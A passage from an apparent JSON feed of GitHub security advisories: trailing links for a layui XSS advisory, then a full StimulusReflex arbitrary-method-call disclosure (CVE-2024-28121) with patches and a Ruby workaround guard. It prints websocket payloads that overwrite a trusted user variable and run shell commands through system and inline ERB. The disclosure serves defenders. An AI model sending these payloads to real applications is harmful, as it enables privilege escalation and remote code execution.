href=\"https://github.com/layui/layui/commit/f756b41d63bf3d488a2cb042918638c9851bf2b0\">https://github.com/layui/layui/commit/f756b41d63bf3d488a2cb042918638c9851bf2b0</a></li>\n<li><a href=\"https://layui.dev/notes/share/security-currentscript.html\">https://layui.dev/notes/share/security-currentscript.html</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47075\">https://nvd.nist.gov/vuln/detail/CVE-2024-47075</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j827-6rgf-9629\">https://github.com/advisories/GHSA-j827-6rgf-9629</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j827-6rgf-9629",
            "title": "[layui] Layui has DOM Clobbering gadgets that leads to Cross-site Scripting",
            "date_modified": "2024-09-26T21:11:03.000Z",
            "date_published": "2024-09-26T17:54:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j827-6rgf-9629"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>More methods than expected can be called on reflex instances. Being able to call some of them has security implications.</p>\n<h3 id=\"details\">Details</h3>\n<p>To invoke a reflex a websocket message of the following shape is sent:</p>\n<pre><code class=\"language-json\">{ \n  \"target\": \"[class_name]#[method_name]\", \n  \"args\": [] \n}\n</code></pre>\n<p>The server will proceed to instantiate <code>reflex</code> using the provided <code>class_name</code> as long as it extends <code>StimulusReflex::Reflex</code>.\nIt then attempts to call <code>method_name</code> on the instance with the provided arguments <a href=\"https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83\">ref</a>:</p>\n<pre><code class=\"language-ruby\">method = reflex.method method_name\nrequired_params = method.parameters.select { |(kind, _)| kind == :req }\noptional_params = method.parameters.select { |(kind, _)| kind == :opt }\n\nif arguments.size &gt;= required_params.size &amp;&amp; arguments.size &lt;= required_params.size + optional_params.size\n  reflex.public_send(method_name, *arguments)\nend\n</code></pre>\n<p>This is problematic as <code>reflex.method(method_name)</code> can be more methods than those explicitly specified by the developer in their reflex class. A good example is the <code>instance_variable_set</code> method.</p>\n<details>\n\n<summary>Read more</summary>\nLet's imagine a reflex that uses `@user` as a trusted variable in an `after_reflex` callback.\n\n<p>This variable can be overwritten using the following message:</p>\n<pre><code class=\"language-json\">{\n  \"target\": \"ChatReflex#instance_variable_set\", \n  \"args\": [\"@user\", \"&lt;admin-id&gt;\"]\n}\n</code></pre>\n<p>Here are other interesting methods that were found to be available for the <a href=\"https://github.com/hopsoft/stimulus_reflex_expo/blob/dcce8c36a6782d1e7f57f0e2766a3f6fd770b3b1/app/reflexes/chat_reflex.rb\">ChatReflex sample reflex</a></p>\n<ul>\n<li><code>remote_byebug</code>: bind a debugging server</li>\n<li><code>pry</code>: drop the process in a REPL session</li>\n</ul>\n<p>All in all, only counting  <code>:req</code> and <code>:opt</code> parameters helps.\nFor example around <a href=\"https://github.com/stimulusreflex/stimulus_reflex/blob/1f610b636abfed27de2c61104aebd1ac98180d5b/lib/stimulus_reflex/channel.rb#L41\">version 1.0</a> only <code>.arity</code> was checked which allowed access to the <code>system</code> method (<code>.arity == -1</code>)</p>\n<pre><code class=\"language-json\">{\n  \"target\": \"ChatReflex#system\", \n  \"args\": [\"[command here]\"]\n}\n</code></pre>\n<p>Using <code>public_send</code> instead of <code>send</code> does not help but the following payloads <strong>do not</strong> work since <code>:rest</code> parameters are not counted in the current version</p>\n<pre><code class=\"language-json\">{\n  \"target\": \"ChatReflex#send\", \n  \"args\": [\"system\", \"[command here]\"] \n}\n</code></pre>\n<pre><code class=\"language-json\">{ \n  \"target\": \"ChatReflex#instance_eval\", \n  \"args\": [\"system('[command here]')\"]\n}\n</code></pre>\n</details>\n\n<p>Pre-versions of 3.5.0 added a <code>render_collection</code> method on reflexes with  a <code>:req</code> parameter. Calling this method could lead to arbitrary code execution:</p>\n<pre><code class=\"language-json\">{\n  \"target\": \"StimulusReflex::Reflex#render_collection\", \n  \"args\": [\n    { \"inline\":  \"&lt;% system('[command here]') %&gt;\" }\n  ]\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patches are <a href=\"https://rubygems.org/gems/stimulus_reflex\">available on RubyGems</a> and on <a href=\"https://npmjs.org/package/stimulus_reflex\">NPM</a>. </p>\n<p>The patched versions are: </p>\n<ul>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2\"><code>3.4.2</code></a></li>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4\"><code>3.5.0.rc4</code></a></li>\n</ul>\n<h3 id=\"workaround\">Workaround</h3>\n<p>You can add this guard to mitigate the issue if running an unpatched version of the library. </p>\n<p>1.) Make sure all your reflexes inherit from the <code>ApplicationReflex</code> class\n2.) Add this <code>before_reflex</code> callback to your <code>app/reflexes/application_reflex.rb</code> file:</p>\n<pre><code class=\"language-ruby\">class ApplicationReflex &lt; StimulusReflex::Reflex\n  before_reflex do\n    ancestors = self.class.ancestors[0..self.class.ancestors.index(StimulusReflex::Reflex) - 1]\n    allowed = ancestors.any? { |a| a.public_instance_methods(false).any?(method_name.to_sym) }\n\n    raise ArgumentError.new(\"Reflex method '#{method_name}' is not defined on class '#{self.class.name}' or on any of its ancestors\") if !allowed\n  end\nend\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/security/advisories/GHSA-f78j-4w3g-4q65\">https://github.com/stimulusreflex/stimulus_reflex/security/advisories/GHSA-f78j-4w3g-4q65</a></li>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/commit/538582d240439aab76066c72335ea92096cd0c7f\">https://github.com/stimulusreflex/stimulus_reflex/commit/538582d240439aab76066c72335ea92096cd0c7f</a></li>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/commit/d823d7348f9ca42eb6df25574f11974e4f5bc88c\">https://github.com/stimulusreflex/stimulus_reflex/commit/d823d7348f9ca42eb6df25574f11974e4f5bc88c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28121\">https://nvd.nist.gov/vuln/detail/CVE-2024-28121</a></li>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83\">https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83</a></li>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2\">https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2</a></li>\n<li><a href=\"https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4\">https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4</a></li>\n<li><a href=\"http://seclists.org/fulldisclosure/2024/Mar/16\">http://seclists.org/fulldisclosure/2024/Mar/16</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/stimulus_reflex/CVE-2024-28121.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/stimulus_reflex/CVE-2024-28121.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f78j-4w3g-4q65\">https://github.com/advisories/GHSA-f78j-4w3g-4q65</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f78j-4w3g-4q65",
            "title": "[stimulus_reflex] StimulusReflex arbitrary method call",
            "date_modified": "2024-09-25T20:56:25.000Z",
            "date_published": "2024-03-12T15:44:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f78j-4w3g-4q65"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}